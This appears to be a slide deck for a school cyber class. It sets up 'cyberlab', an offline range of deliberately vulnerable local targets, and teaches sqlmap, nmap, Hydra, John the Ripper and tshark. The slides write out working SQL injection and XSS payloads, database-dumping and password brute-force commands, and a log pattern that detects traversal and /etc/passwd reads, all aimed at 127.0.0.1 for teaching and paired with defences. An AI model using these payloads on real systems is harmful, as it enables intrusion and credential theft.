Cyber class · offline lab

cyberlab

Set it up, attack practice targets on your own machine, and learn the tools the pros use.

Use the arrow keys or the buttons to move between slides.

What it is

A practice range that never leaves your computer

  • cyberlab starts deliberately vulnerable websites and services on 127.0.0.1, your own machine.
  • You attack them with real tools: Firefox, curl, sqlmap, nmap, Wireshark, John the Ripper, Hydra, gobuster.
  • Each challenge hides a flag like FLAG{1d4f8747eef0433a37d4}. Submit it to score.
  • Once you've solved a challenge, cyberlab names the vulnerability, links its Wikipedia article and explains how to defend against it.
  • 13 challenges in four tracks: web, network, passwords, logs.
  • No internet needed after the download.
  • Every student gets different flags, so copying a classmate's doesn't work.
Setup · before you start

What you need

  • Linux Mint 22.x (built on Ubuntu 24.04 "noble"), 64-bit. A VM is fine.
  • Your account's sudo password. It's needed once, to install the tools.
  • Internet only to download: about 304 MB.
  • Leave at least 2 GB free for unpacking and installing.

Check your system (in a terminal)

$ grep UBUNTU_CODENAME /etc/os-release
UBUNTU_CODENAME=noble
$ dpkg --print-architecture
amd64

Both must match. On anything else, the tools installer stops with a message saying which pack you need.

How it works

Every challenge: start, attack, submit, learn

$ cyberlab start web-sqli    # start it, see the goal
$ cyberlab hint web-sqli     # next hint
$ cyberlab submit web-sqli FLAG{…}
$ cyberlab learn web-sqli    # the lesson again
$ cyberlab learn             # all you've solved
$ cyberlab stop              # stop all targets
$ cyberlab start web-sqli

Tools · web

curl: send web requests from the terminal

curl sends exactly the request you write, with nothing hidden. It's the quickest way to test one input.

Flags you'll use

  • -s quiet, -i show response headers
  • -d name=value send form data (POST)
  • --data-urlencode the same, with quotes and spaces encoded for you
  • -F file=@path upload a file

web-sqli: log in as admin

curl -s http://127.0.0.1:8080/login \
  --data-urlencode "username=admin' --" -d password=x

web-idor: ask for someone else's record

curl -i 'http://127.0.0.1:8080/account?id=101'   # yours
curl -i 'http://127.0.0.1:8080/account?id=100'   # not yours

Compare with the fixed version

curl -i 'http://127.0.0.1:8080/secure/account?id=100'
Tools · web

Firefox: see what the page does with your input

For web-xss, the search page puts your search term into its HTML without escaping it.

Press Ctrl+U (View Page Source) and find your search term. If your tags show up as real HTML, a script tag will run too.

1. Test: is the word bold?

<b>hello</b>

2. Type into the search box

<script>alert(1)</script>

3. When a filter strips <script>, event handlers still run

<img src=x onerror=alert(document.domain)>
Tools · web

sqlmap: find and exploit SQL injection automatically

sqlmap tries hundreds of injection payloads against each parameter, then uses the one that works to read the database.

  • -u the URL
  • --data the form fields (any values)
  • --batch accept the default answers
  • --dump print the tables it can read

web-sqli

sqlmap -u http://127.0.0.1:8080/login \
  --data 'username=a&password=b' --batch --dump

Look for the users table in the output. It holds every username and password, which shows why a login bypass is only the start.

Tools · web

gobuster: find pages nothing links to

gobuster asks the server for every name in a wordlist. A missing page returns 404, so any other status code means the path exists.

  • 200 readable
  • 403 exists but locked

web-gobuster (the wordlist is made by cyberlab start)

gobuster dir -u http://127.0.0.1:8092 \
  -w ~/cyberlab/web-gobuster/wordlist.txt

Also look for backup files by extension

gobuster dir -u http://127.0.0.1:8092 \
  -w ~/cyberlab/web-gobuster/wordlist.txt -x sql,bak,zip,old

Always read robots.txt first

curl -s http://127.0.0.1:8092/robots.txt
Tools · network

nmap: which ports are open, and what's on them

Every network service listens on a port. nmap knocks on each port in a range and reports which ones answer.

  • -p 9000-9099 ports to check
  • -sV ask each open port what software it runs

Scan only 127.0.0.1. Scanning machines without the owner's permission breaks school rules and can break the law.

net-nmap: what's open?

nmap -p 9000-9099 127.0.0.1

What is it?

nmap -sV -p 9000-9099 127.0.0.1

Talk to one port yourself (netcat). Most services introduce themselves.

nc 127.0.0.1 <port>

The defender's view: what is my machine listening on?

ss -tlnp
Tools · network

Wireshark and tshark: read captured network traffic

A .pcap file is a recording of network packets. Wireshark shows it in a window. tshark is the same tool for the terminal.

Display filters (type in Wireshark's filter bar)

  • http web traffic only
  • http.request.method==POST form submissions
  • dns name lookups

net-http-creds: a password sent without encryption

wireshark ~/cyberlab/net-http-creds/capture.pcap
tshark -r ~/cyberlab/net-http-creds/capture.pcap \
  -Y 'http.request.method==POST' -x

net-port-scan: who sent the most connection attempts?

tshark -r ~/cyberlab/net-port-scan/capture.pcap \
  -Y 'tcp.flags.syn==1 && tcp.flags.ack==0' \
  -T fields -e ip.src | sort | uniq -c | sort -rn

net-dns-tunnel: list the names being looked up

tshark -r ~/cyberlab/net-dns-tunnel/capture.pcap -Y dns \
  -T fields -e dns.qry.name | sort | uniq -c | sort -rn | head
Tools · passwords

John the Ripper: crack stolen password hashes

Sites store a hash of each password, not the password itself. John hashes every word in a list and checks whether the result matches a stolen hash.

A fast hash with no salt, like MD5 here, lets a laptop try millions of guesses a second.

dict-john (files are made by cyberlab start)

cd ~/cyberlab/dict-john
john --format=raw-md5 --wordlist=wordlist.txt hashes.txt
john --show --format=raw-md5 hashes.txt

What John does, one guess by hand

echo -n 'summer2024' | md5sum
cat hashes.txt

Try variations too (Summer2024!, summer2025 …)

john --format=raw-md5 --wordlist=wordlist.txt --rules hashes.txt
Tools · passwords

Hydra: guess passwords against a live login

John works offline on stolen hashes. Hydra works online: it submits the real login form once for every password in the list.

The last argument is three parts joined by :

  • the form's path, /login
  • the form body, with ^USER^ and ^PASS^ where the guesses go
  • F= text that means the login failed

dict-hydra

cd ~/cyberlab/dict-hydra
hydra -l admin -P wordlist.txt -s 8091 127.0.0.1 http-post-form \
  '/login:username=^USER^&password=^PASS^:F=Invalid username or password'

The server's view: one log line per guess

grep -c 'POST /login' ~/cyberlab/logs/httpauth.log

Defenders stop this with rate limits, lockouts and multi-factor authentication.

Tools · logs

grep, awk and sort: investigate a web server log

Every request a web server receives is one line in its access log. The first field on each line is the visitor's IP address.

  • grep -n find matching lines, with line numbers
  • awk '{print $1}' print the first field
  • sort | uniq -c | sort -rn count and rank

web-log-forensics: look for directory traversal (../)

grep -niE '(\.\./|%2e%2e|/etc/passwd)' \
  ~/cyberlab/web-log-forensics/access.log

Which addresses sent the most requests?

awk '{print $1}' ~/cyberlab/web-log-forensics/access.log \
  | sort | uniq -c | sort -rn
Wrap up

Rules, and handing in your work

Rules

  • Attack only the targets cyberlab start gives you, on 127.0.0.1.
  • Breaking into or attacking systems without the owner's written permission is a crime in most countries.
  • Run cyberlab stop when you're done.

Hand in your progress

cyberlab report --name "Your Name" -o ~/Desktop/report.txt

Review everything you've learned

cyberlab learn

Start over with new flags

cyberlab reset
